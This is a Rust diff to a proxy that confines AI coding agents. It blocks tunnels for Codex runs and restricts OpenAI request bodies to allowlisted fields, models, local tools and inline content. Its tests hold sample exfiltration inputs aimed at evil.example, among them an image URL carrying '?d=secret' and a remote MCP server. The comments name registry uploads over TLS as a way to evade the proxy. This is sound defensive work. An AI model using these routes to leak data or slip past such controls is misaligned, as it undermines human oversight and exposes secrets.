@@ -293,6 +293,11 @@ pub fn decide(
         let Ok(run) = verify_run_token(key, &token, now_unix) else {
             return deny("bad_run_token", None);
         };
+        // A Codex agent has a shell: no tunnel at all, since registries accept
+        // uploads inside the TLS stream the proxy cannot see.
+        if run.run_id.ends_with(CODEX_SUFFIX) {
+            return deny("token_scope", Some(&run));
+        }
         let Some((host, port)) = target.rsplit_once(':') else {
             return deny("bad_connect_target", Some(&run));
         };
@@ -387,13 +392,79 @@ pub fn decide(
 const OPENAI_LOCAL_TOOLS: &[&str] = &["function", "custom", "local_shell"];
 
 /// Requests one Codex run may send through the proxy.
-pub const MAX_OPENAI_REQUESTS_PER_RUN: u32 = 1_000;
+pub const MAX_OPENAI_REQUESTS_PER_RUN: u32 = 300;
+/// Largest Codex request body the proxy reads (it is buffered to be checked).
+pub const MAX_OPENAI_REQUEST_BYTES: usize = 8 * 1024 * 1024;
+/// Output tokens one Codex request may ask for.
+pub const MAX_OPENAI_OUTPUT_TOKENS: u64 = 64_000;
+
+/// Top-level fields a Codex request may carry. Anything that points at state
+/// stored in the OpenAI account (`prompt`, `conversation`,
+/// `previous_response_id`) or runs detached (`background`) is refused.
+const OPENAI_REQUEST_FIELDS: &[&str] = &[
+    "model",
+    "input",
+    "instructions",
+    "tools",
+    "tool_choice",
+    "parallel_tool_calls",
+    "reasoning",
+    "store",
+    "stream",
+    "include",
+    "text",
+    "prompt_cache_key",
+    "client_metadata",
+    "max_output_tokens",
+    "service_tier",
+    "truncation",
+];
+
+/// Whether an `input` tree only carries inline content: every URL OpenAI would
+/// fetch must be a `data:` URL, and no stored file is referenced.
+fn inline_only(value: &serde_json::Value) -> bool {
+    match value {
+        serde_json::Value::Object(map) => map.iter().all(|(key, value)| match key.as_str() {
+            "image_url" | "file_url" | "url" => match value {
+                serde_json::Value::String(url) => url.starts_with("data:"),
+                serde_json::Value::Null => true,
+                other => inline_only(other),
+            },
+            "file_id" => value.is_null(),
+            _ => inline_only(value),
+        }),
+        serde_json::Value::Array(items) => items.iter().all(inline_only),
+        _ => true,
+    }
+}
 
 /// The body forwarded to OpenAI's Responses API, or why it is refused: a JSON
-/// object, only local tools, never a background job, and never stored by OpenAI.
-pub fn openai_request_body(body: &[u8]) -> Result<Vec<u8>, &'static str> {
+/// object with known fields, a model the factory allows, only local tools and
+/// inline content (nothing OpenAI would fetch or look up), bounded output, the
+/// default service tier, and never stored by OpenAI.
+pub fn openai_request_body(body: &[u8], allowed_models: &[String]) -> Result<Vec<u8>, &'static str> {
     let mut request: serde_json::Value = serde_json::from_slice(body).map_err(|_| "body_not_json")?;
     let object = request.as_object_mut().ok_or("body_not_object")?;
+    if object.keys().any(|key| !OPENAI_REQUEST_FIELDS.contains(&key.as_str())) {
+        return Err("field_not_allowed");
+    }
+    let model = object.get("model").and_then(|m| m.as_str()).ok_or("model_missing")?;
+    if !allowed_models.iter().any(|allowed| allowed == model) {
+        return Err("model_not_allowed");
+    }
+    if !object.get("input").is_none_or(inline_only) {
+        return Err("remote_content_not_allowed");
+    }
+    match object.get("tool_choice") {
+        None => {}
+        Some(serde_json::Value::String(choice)) if matches!(choice.as_str(), "auto" | "none" | "required") => {}
+        Some(choice)
+            if choice
+                .get("type")
+                .and_then(|t| t.as_str())
+                .is_some_and(|t| OPENAI_LOCAL_TOOLS.contains(&t)) => {}
+        Some(_) => return Err("tool_choice_not_allowed"),
+    }
     if let Some(tools) = object.get("tools") {
         let tools = tools.as_array().ok_or("tools_not_array")?;
         let local = tools.iter().all(|tool| {
@@ -405,9 +476,12 @@ pub fn openai_request_body(body: &[u8]) -> Result<Vec<u8>, &'static str> {
             return Err("hosted_tool_not_allowed");
         }
     }
-    if object.get("background").and_then(|v| v.as_bool()) == Some(true) {
-        return Err("background_not_allowed");
-    }
+    object.remove("service_tier");
+    let output = object
+        .get("max_output_tokens")
+        .and_then(|v| v.as_u64())
+        .map_or(MAX_OPENAI_OUTPUT_TOKENS, |asked| asked.min(MAX_OPENAI_OUTPUT_TOKENS));
+    object.insert("max_output_tokens".into(), output.into());
     object.insert("store".into(), serde_json::Value::Bool(false));
     serde_json::to_vec(&request).map_err(|_| "body_not_json")
 }
@@ -1054,6 +1128,12 @@ mod tests {
         let claude = sign_run_token(key, "org-1", "run-1", 2_000_000_000).unwrap();
         assert!(matches!(scope(&claude, "openai/v1/responses"), Decision::Deny { reason: "token_scope", .. }));
         assert!(matches!(scope(&claude, "anthropic/v1/messages"), Decision::Reverse { .. }));
+        // A Codex token opens no tunnel, not even to an allowlisted registry.
+        let basic = format!("Basic {}", base64::Engine::encode(&base64::engine::general_purpose::STANDARD, format!("run:{token}")));
+        assert!(matches!(
+            decide(key, "CONNECT", "registry.npmjs.org:443", Some(&basic), &["registry.npmjs.org"], 1_000),
+            Decision::Deny { reason: "token_scope", .. }
+        ));
         // Code under test never reaches it.
         let registry = sign_run_token(key, "org-1", &registry_only_run_id("run-1"), 2_000_000_000).unwrap();
         assert!(matches!(
@@ -1064,20 +1144,46 @@ mod tests {
 
     #[test]
     fn openai_bodies_keep_only_local_tools_and_are_never_stored() {
-        let body = |value: serde_json::Value| openai_request_body(value.to_string().as_bytes());
-        let ok = body(serde_json::json!({"model": "m", "store": true, "tools": [{"type": "function", "name": "shell"}, {"type": "custom", "name": "apply_patch"}]})).unwrap();
+        let models = vec!["gpt-6.1-sol".to_string()];
+        let body = |value: serde_json::Value| openai_request_body(value.to_string().as_bytes(), &models);
+        let ok = body(serde_json::json!({
+            "model": "gpt-6.1-sol", "store": true, "service_tier": "priority", "max_output_tokens": 999_999,
+            "tool_choice": "auto",
+            "input": [{"role": "user", "content": [{"type": "input_image", "image_url": "data:image/png;base64,AAA"}]}],
+            "tools": [{"type": "function", "name": "shell"}, {"type": "custom", "name": "apply_patch"}]
+        }))
+        .unwrap();
         let ok: serde_json::Value = serde_json::from_slice(&ok).unwrap();
         assert_eq!(ok["store"], false);
-        assert!(body(serde_json::json!({"model": "m"})).is_ok());
+        assert!(ok.get("service_tier").is_none());
+        assert_eq!(ok["max_output_tokens"], MAX_OPENAI_OUTPUT_TOKENS);
+        assert!(body(serde_json::json!({"model": "gpt-6.1-sol"})).is_ok());
         for (request, reason) in [
-            (serde_json::json!({"tools": [{"type": "web_search"}]}), "hosted_tool_not_allowed"),
-            (serde_json::json!({"tools": [{"type": "function"}, {"type": "mcp", "server_url": "https://evil.example"}]}), "hosted_tool_not_allowed"),
-            (serde_json::json!({"tools": [{"name": "untyped"}]}), "hosted_tool_not_allowed"),
-            (serde_json::json!({"background": true}), "background_not_allowed"),
+            (serde_json::json!({"model": "gpt-6-pro"}), "model_not_allowed"),
+            (serde_json::json!({"input": "x"}), "model_missing"),
+            (serde_json::json!({"model": "gpt-6.1-sol", "tools": [{"type": "web_search"}]}), "hosted_tool_not_allowed"),
+            (serde_json::json!({"model": "gpt-6.1-sol", "tools": [{"type": "function"}, {"type": "mcp", "server_url": "https://evil.example"}]}), "hosted_tool_not_allowed"),
+            (serde_json::json!({"model": "gpt-6.1-sol", "tools": [{"name": "untyped"}]}), "hosted_tool_not_allowed"),
+            (serde_json::json!({"model": "gpt-6.1-sol", "background": "true"}), "field_not_allowed"),
+            (serde_json::json!({"model": "gpt-6.1-sol", "prompt": {"id": "pmpt_1"}}), "field_not_allowed"),
+            (serde_json::json!({"model": "gpt-6.1-sol", "previous_response_id": "resp_1"}), "field_not_allowed"),
+            (serde_json::json!({"model": "gpt-6.1-sol", "tool_choice": {"type": "web_search_preview"}}), "tool_choice_not_allowed"),
+            (
+                serde_json::json!({"model": "gpt-6.1-sol", "input": [{"content": [{"type": "input_image", "image_url": "https://evil.example/?d=secret"}]}]}),
+                "remote_content_not_allowed",
+            ),
+            (
+                serde_json::json!({"model": "gpt-6.1-sol", "input": [{"content": [{"type": "input_file", "file_url": "https://evil.example/f"}]}]}),
+                "remote_content_not_allowed",
+            ),
+            (
+                serde_json::json!({"model": "gpt-6.1-sol", "input": [{"content": [{"type": "input_file", "file_id": "file_1"}]}]}),
+                "remote_content_not_allowed",
+            ),
             (serde_json::json!(["not", "an", "object"]), "body_not_object"),
         ] {
             assert_eq!(body(request).unwrap_err(), reason);
         }
-        assert_eq!(openai_request_body(b"not json").unwrap_err(), "body_not_json");
+        assert_eq!(openai_request_body(b"not json", &models).unwrap_err(), "body_not_json");
     }
 }
